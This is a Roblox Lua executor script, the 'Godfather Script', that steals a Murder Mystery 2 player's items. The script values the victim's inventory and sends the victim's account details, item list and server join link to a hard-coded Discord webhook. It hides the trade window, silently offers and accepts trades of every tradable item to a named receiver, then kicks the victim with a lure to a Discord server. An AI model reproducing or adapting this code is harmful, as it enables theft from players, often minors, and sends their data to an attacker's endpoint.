repeat task.wait() until game:IsLoaded()
task.wait(2)

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- DEBUG: Print all JobId retrieval attempts
print("=== Starting JobId Debug ===")

local JobId = "UNKNOWN"
local methodUsed = "None"

-- Method 1: Direct game.JobId
local success1, result1 = pcall(function() 
    return game.JobId 
end)
print("Method 1 (game.JobId):", success1, "Result:", result1)
if success1 and result1 and result1 ~= "" then 
    JobId = result1 
    methodUsed = "game.JobId"
end

-- Method 2: game:GetJobId()
if JobId == "UNKNOWN" then
    local success2, result2 = pcall(function() 
        return game:GetJobId() 
    end)
    print("Method 2 (game:GetJobId()):", success2, "Result:", result2)
    if success2 and result2 and result2 ~= "" then 
        JobId = result2 
        methodUsed = "game:GetJobId()"
    end
end

-- Method 3: DataModel
if JobId == "UNKNOWN" then
    local success3, result3 = pcall(function() 
        local dm = game:GetService("DataModel")
        return dm.JobId 
    end)
    print("Method 3 (DataModel.JobId):", success3, "Result:", result3)
    if success3 and result3 and result3 ~= "" then 
        JobId = result3 
        methodUsed = "DataModel.JobId"
    end
end

-- Method 4: TeleportService GetCurrentJobId
if JobId == "UNKNOWN" then
    local success4, result4 = pcall(function()
        local ts = game:GetService("TeleportService")
        if ts.GetCurrentJobId then
            return ts:GetCurrentJobId()
        end
        return nil
    end)
    print("Method 4 (TeleportService.GetCurrentJobId):", success4, "Result:", result4)
    if success4 and result4 and result4 ~= "" then 
        JobId = result4 
        methodUsed = "TeleportService"
    end
end

-- Method 5: TeleportService GetPlayerPlaceInstanceAsync
if JobId == "UNKNOWN" then
    local success5, result5 = pcall(function()
        local ts = game:GetService("TeleportService")
        local plr = game:GetService("Players").LocalPlayer
        local _, _, jobId = ts:GetPlayerPlaceInstanceAsync(plr.UserId)
        return jobId
    end)
    print("Method 5 (GetPlayerPlaceInstanceAsync):", success5, "Result:", result5)
    if success5 and result5 and result5 ~= "" then 
        JobId = result5 
        methodUsed = "GetPlayerPlaceInstanceAsync"
    end
end

-- Method 6: Check if we're in a reserved server
if JobId == "UNKNOWN" then
    local success6, result6 = pcall(function()
        return game.PrivateServerId
    end)
    print("Method 6 (PrivateServerId):", success6, "Result:", result6)
end

-- Method 7: InstanceId as alternative
if JobId == "UNKNOWN" then
    local success7, result7 = pcall(function()
        return game.InstanceId
    end)
    print("Method 7 (InstanceId):", success7, "Result:", result7)
    if success7 and result7 and result7 ~= "" and result7 ~= "0" then
        -- InstanceId can sometimes be used as fallback
        print("Note: InstanceId available but different from JobId")
    end
end

-- Final result
print("=== Final JobId Result ===")
print("JobId:", JobId)
print("Method Used:", methodUsed)
print("Is UNKNOWN:", JobId == "UNKNOWN")

-- If all methods failed, generate placeholder
if JobId == "UNKNOWN" then
    JobId = "BLOCKED-" .. tostring(math.random(100000, 999999))
    print("Generated placeholder:", JobId)
end

-- Continue with rest of script...
local cfg = (getgenv and getgenv()) or {}
cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
cfg.pingEveryone = "Yes"

local users = {"Getstompedbyyounes"}        
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer

if not plr then return end

print("Player:", plr.Name, "PlaceId:", game.PlaceId, "JobId:", JobId)

local isTradeCompleted = false
local totalInventoryValue = 0

-- ... rest of your script continues here with the embedded values database ...
-- FIXED: Better request function detection with proper fallbacks
local function findRequest()
    -- Check for specific executor functions first
    if syn and syn.request then
        return syn.request, "Synapse X"
    elseif fluxus and fluxus.request then
        return fluxus.request, "Fluxus"
    elseif httpx and httpx.request then
        return httpx.request, "Hydrogen"
    elseif http and http.request then
        return http.request, "Electron"
    elseif http_request then
        return http_request, "Script-Ware / KRNL"
    elseif request then
        -- Only use generic request if it actually exists and is a function
        if type(request) == "function" then
            return request, "Delta / Generic"
        end
    end

    -- Return nil if no request function found - will handle gracefully later
    return nil, "None"
end

local PlaceId = game.PlaceId

-- FIXED: Multiple methods to get JobId when blocked


local fernJoinerLink = string.format(
    "https://plsbrainrot.me/joiner?placeId=%d&gameInstanceId=%s", PlaceId, JobId
)

local function GodfatherScriptFetchSupremeValues()
    local values = {}
    local execRequest, _ = findRequest()
    
    -- FIXED: Check if request function exists before using
    if not execRequest then
        warn("No request function available - using default values")
        return values
    end
    
    local success, result = pcall(function()
        local response = execRequest({
            Url = "https://api.supremevaluelist.com/mm2/items",
            Method = "GET",
            Headers = { ["User-Agent"] = "Mozilla/5.0" }
        })
        if response and response.Body then
            return HttpService:JSONDecode(response.Body)
        end
        return nil
    end)
    
    if success and result then
        for _, item in ipairs(result) do
            if item.name and item.value then
                values[item.name:lower()] = item.value
            end
        end
    else
        warn("Failed to fetch values: " .. tostring(result))
    end
    return values
end

local supremeValues = GodfatherScriptFetchSupremeValues()

local function GodfatherScriptGetItemValue(itemName, rarity)
    if not itemName then return 0 end
    local lowerName = itemName:lower()
    if supremeValues[lowerName] then return supremeValues[lowerName] end
    
    if lowerName:find("chroma") then
        local baseName = lowerName:gsub("chroma ", "")
        if supremeValues[baseName] then return supremeValues[baseName] * 2 end
    end
    
    local defaultValues = { Common = 1, Uncommon = 2, Rare = 3, Legendary = 5, Godly = 10, Ancient = 20, Unique = 30, Vintage = 50 }
    return defaultValues[rarity] or 1
end

if not plr.Character then plr.CharacterAdded:Wait() end
task.wait(1)

local Trade = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")

local LastOffer = nil
Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
    if x and x.LastOffer then LastOffer = x.LastOffer end
end)

local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:WaitForChild(guiName, 3)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

-- FIXED: Better error handling for database loading
local database = nil
local profileData = nil

pcall(function()
    database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
end)

if not database then
    warn("Failed to load database - script cannot continue")
    return
end

pcall(function()
    profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
end)

if not profileData or not profileData.Weapons or not profileData.Weapons.Owned then
    warn("Failed to load profile data - script cannot continue")
    return
end

local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}

local function GodfatherScriptIsDefaultItem(itemName)
    if not itemName then return false end
    local lower = itemName:lower()
    return lower:find("default") and (lower:find("gun") or lower:find("knife"))
end

local weaponsToSend = {}
local rarityCounts = {}

for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
    local item = database[dataid]
    if item then
        if GodfatherScriptIsDefaultItem(item.ItemName) or GodfatherScriptIsDefaultItem(dataid) then continue end
        
        local rarity = item.Rarity or "Common"
        local itemValue = GodfatherScriptGetItemValue(item.ItemName, rarity)
        local totalItemValue = itemValue * amount
        
        totalInventoryValue = totalInventoryValue + totalItemValue
        
        -- FIXED: Better untradable check
        local isUntradable = false
        pcall(function()
            if dataid:lower():find("untradable") or (item.ItemName and item.ItemName:lower():find("untradable")) then
                isUntradable = true
            end
        end)
        
        if not isUntradable then
            table.insert(weaponsToSend, {
                DataID = dataid,
                ItemName = item.ItemName or dataid,
                Amount = amount,
                Rarity = rarity,
                Value = itemValue,
                TotalValue = totalItemValue
            })
            rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
        end
    end
end

table.sort(weaponsToSend, function(a, b) return (a.TotalValue) > (b.TotalValue) end)

local itemsListText = ""
for i = 1, math.min(20, #weaponsToSend) do
    local item = weaponsToSend[i]
    itemsListText = itemsListText .. string.format("%s x%d (%d value)\n", item.ItemName, item.Amount, item.TotalValue)
end

if #weaponsToSend > 20 then
    itemsListText = itemsListText .. string.format("\nand %d more items", #weaponsToSend - 20)
end

local rarityText = ""
for _, rarity in ipairs(rarityTable) do
    if rarityCounts[rarity] and rarityCounts[rarity] > 0 then
        rarityText = rarityText .. string.format("%s: %d\n", rarity, rarityCounts[rarity])
    end
end

local function GodfatherScriptSendWebhook()
    local execRequest, executorName = findRequest()
    
    -- FIXED: Check if webhook can be sent
    if not execRequest then
        warn("No request function available - webhook cannot be sent")
        return false
    end
    
    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
    local targetName = users[1] or "Unknown"
    
    -- FIXED: Handle potential nil values in player data
    local displayName = plr.DisplayName or plr.Name or "Unknown"
    local userName = plr.Name or "Unknown"
    local userId = plr.UserId or 0
    local accountAge = plr.AccountAge or 0
    
    local embed = {
        title = string.format("Godfather Script | %s | %s", displayName, targetName),
        description = string.format("%s's inventory grabbed!\nTotal Value: %d\nJoin and trade:", userName, totalInventoryValue),
        color = 0xFF0000,
        thumbnail = {url = avatarUrl},
        fields = {
            {
                name = "Player Info",
                value = string.format("Display: %s\nUsername: %s\nUser ID: %d\nAccount Age: %d days\nExecutor: %s",
                    displayName, userName, userId, accountAge, executorName),
                inline = true
            },
            {
                name = "Join Link",
                value = string.format("[Click to Join](%s)\n```\n%s\n```", fernJoinerLink, fernJoinerLink),
                inline = false
            },
            {
                name = "Server Info",
                value = string.format("JobId: %s\nPlaceId: %d", JobId, PlaceId),
                inline = true
            },
            {
                name = "Total Items",
                value = string.format("%d items\nValue: %d", #weaponsToSend, totalInventoryValue),
                inline = true
            },
            {
                name = "Rarity Distribution",
                value = rarityText ~= "" and rarityText or "No data",
                inline = false
            },
            {
                name = string.format("Top Items (%d)", math.min(20, #weaponsToSend)),
                value = itemsListText ~= "" and itemsListText or "No items",
                inline = false
            },
            {
                name = "Target Receiver",
                value = string.format("%s", targetName),
                inline = true
            }
        },
        footer = {
            text = string.format("Godfather Script | %s", os.date("%d/%m/%Y %H:%M"))
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local payload = {
        content = cfg.pingEveryone == "Yes" and "@everyone Godfather Script Hit!" or nil,
        embeds = {embed}
    }
    
    -- FIXED: Proper pcall and return handling
    local success, result = pcall(function()
        return execRequest({
            Url = cfg.webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success then
        print("Webhook sent successfully")
        return true
    else
        warn("Webhook failed: " .. tostring(result))
        return false
    end
end

GodfatherScriptSendWebhook()

local function GodfatherScriptGetStatus()
    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
    return ok and status or "None"
end

local function GodfatherScriptWaitForTarget(targetPlayer)
    local attempts = 0
    while attempts < 30 do
        if targetPlayer and targetPlayer.Parent then
            local char = targetPlayer.Character
            if char and char:FindFirstChild("Humanoid") then return true end
        end
        attempts = attempts + 1
        task.wait(0.5)
    end
    return false
end

local function GodfatherScriptAcceptTrade()
    -- FIXED: Check LastOffer exists and is valid
    if not LastOffer then 
        warn("Cannot accept trade: LastOffer is nil")
        return false 
    end
    
    local ok, err = pcall(function()
        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
    end)
    
    if not ok then
        warn("AcceptTrade failed: " .. tostring(err))
    end
    
    return ok
end

local function GodfatherScriptFinishAndKick()
    isTradeCompleted = true
    task.wait(2)
    local discordLink = "https://discord.gg/dUaHggzp9q"
    
    -- FIXED: Safe clipboard setting
    pcall(function()
        if setclipboard then 
            setclipboard(discordLink) 
        end
    end)
    
    -- FIXED: Safe kick with error handling
    pcall(function()
        plr:Kick("Godfather Script\n\nItems taken successfully\n\n" .. discordLink .. "\n\nJoin to get your items back!")
    end)
end

function GodfatherScriptDoTrade(targetPlayer)
    if not targetPlayer or not targetPlayer.Parent then 
        warn("Target player is nil or left")
        return 
    end
    
    if not GodfatherScriptWaitForTarget(targetPlayer) then 
        warn("Target player character never loaded")
        return 
    end
    
    pcall(function() DeclineTrade:FireServer() end)
    task.wait(0.5)
    LastOffer = nil
    
    local itemsAdded = false
    local timeout = 0
    
    while timeout < 60 and #weaponsToSend > 0 do
        local success, err = pcall(function()
            local status = GodfatherScriptGetStatus()
            
            if status == "None" then
                if itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do 
                        if #weaponsToSend > 0 then
                            table.remove(weaponsToSend, 1) 
                        end
                    end
                    itemsAdded = false
                    LastOffer = nil
                    task.wait(0.5)
                else
                    SendRequest:InvokeServer(targetPlayer)
                    task.wait(1.5)
                end
            elseif status == "SendingRequest" then
                task.wait(0.5)
            elseif status == "ReceivingRequest" then
                DeclineTrade:FireServer()
                task.wait(0.3)
            elseif status == "StartTrade" then
                if not itemsAdded then
                    -- FIXED: Check weaponsToSend still has items
                    local itemsToOffer = math.min(4, #weaponsToSend)
                    for i = 1, itemsToOffer do
                        local item = weaponsToSend[i]
                        if item then
                            for _ = 1, item.Amount do
                                OfferItem:FireServer(item.DataID, "Weapons")
                            end
                            task.wait(0.1)
                        end
                    end
                    itemsAdded = true
                    task.spawn(function()
                        task.wait(6.5)
                        GodfatherScriptAcceptTrade()
                    end)
                else
                    task.wait(1)
                end
            end
        end)
        
        if not success then 
            warn("Trade loop error: " .. tostring(err))
            task.wait(1) 
        end
        timeout = timeout + 1
    end
    
    if #weaponsToSend == 0 then 
        GodfatherScriptFinishAndKick() 
    end
end

local function GodfatherScriptIsTarget(name)
    if not name then return false end
    for _, u in ipairs(users) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if GodfatherScriptIsTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            GodfatherScriptDoTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and GodfatherScriptIsTarget(p.Name) then
        task.spawn(function()
            task.wait(2)
            GodfatherScriptDoTrade(p)
        end)
        break
    end
end

while not isTradeCompleted do
    task.wait(1)
end
